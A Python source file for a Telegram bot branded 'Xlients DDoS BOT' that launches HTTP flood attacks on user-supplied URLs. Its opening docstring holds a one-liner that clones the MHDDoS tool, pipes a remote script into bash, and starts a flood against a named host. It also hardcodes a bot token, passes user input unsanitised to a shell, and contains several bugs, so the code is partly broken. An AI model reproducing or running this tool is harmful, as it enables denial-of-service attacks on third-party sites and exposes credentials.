"""
/usr/bin/python3 -m pip install --upgrade pip
pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET panpan-bot1.glitch.me 1 100 mhddos_proxy/list 100 5
""" 


import os
import telegram 
import requests 
import bot
import httpfspoof
import Update
from telegram.ext import Updater, CallbackContext, CommandHandler, MessageHandler, Filters, update
from telegram.update import Update
import re
import subprocess
import concurrent.futures
import random, datetime, telegram    

#Telegram token
token = os.getenv('token', '6913749718:AAFbf7ZYAT62CFyfY7idamUL_PoPrZ3iOkU')
bot_number = os.getenv('bot_number', '999999999')
methods = ['methods', '/httpfspoof', '/help', 'start'] # Methods
updater = Updater(token, use_context = True)
s = 50,000
t = 50000


def start(update: Update, context: CallbackContext):
  update.message.reply_text(f"Welcome To ⊂🚀⊃  Xlients DDoS BOT  ⊂🚀⊃ \nUser Slash Command\n\nNeed Help? Pv @xlients")


def tmps(update: Update, context: CallbackContext):
  global s
  s = update.message.text.replace('/t', '')
  update.message.reply_text(f"Ok pour run pour {s} s")

def help(update: Update, context: CallbackContext):
   url = update.message.text.replace('/help', '')
   update.massage.reply_text(f'''
   🚀 𝙈𝙀𝙏𝙃𝙊𝘿𝙎 🚀
═════════════════
/httpfspoof [𝙪𝙧𝙡] [𝙩𝙞𝙢𝙚] [𝙩𝙝𝙧𝙚𝙖𝙙] ( Free For Anyone HTTPS/2.0 ) 

𝚔𝚊𝚖𝚒 𝚊𝚔𝚊𝚗 𝚖𝚎𝚗𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝚕𝚎𝚋𝚒𝚑 𝚋𝚊𝚗𝚢𝚊𝚔 𝚖𝚎𝚝𝚑𝚘𝚍𝚜

@xlients

            ''')


def httpfspoof(update: Update, context: CallbackContext):
  url = update.message.text.replace('/httpfspoof', '')
  update.message.reply_text(f"Attack Sent Successfully!!! (Allow 20 Seconds For Attack To Start)")
  url_str = str(url)
  print(url_str)
  p = subprocess.Popen(f'python3 https-spoof.py {url} {time} {Threads}', stdout=subprocess.PIPE, shell=True)
  output, error = p.communicate()
  if error:
    update.message.reply_text(f'You Have Exceeded Your Maximum Concurrents!')
  else:
     # Divise l'output en plusieurs parties
    parts = output.decode().split('\n')

    # Envoie chaque partie de l'output au chat
    for part in parts:
      chat_id = str(update.effective_user.id)
      update.message.bot.send_message(
        chat_id = chat_id,
        text=part,
        disable_web_page_preview=True,
        parse_mode='HTML'
      )
            


#Trigger des fonctions
updater.dispatcher.add_handler(CommandHandler('t', tmps))

updater.dispatcher.add_handler(CommandHandler('/httpfspoof', httpfspoof))
updater.dispatcher.add_handler(CommandHandler('start', start))
updater.dispatcher.add_handler(CommandHandler('/help', help))
updater.dispatcher.add_handler(CommandHandler('/httpfspoof', httpfspoof))
#Run the bot
updater.start_polling()

if __name__ == '__main__':
    updater.start_polling()
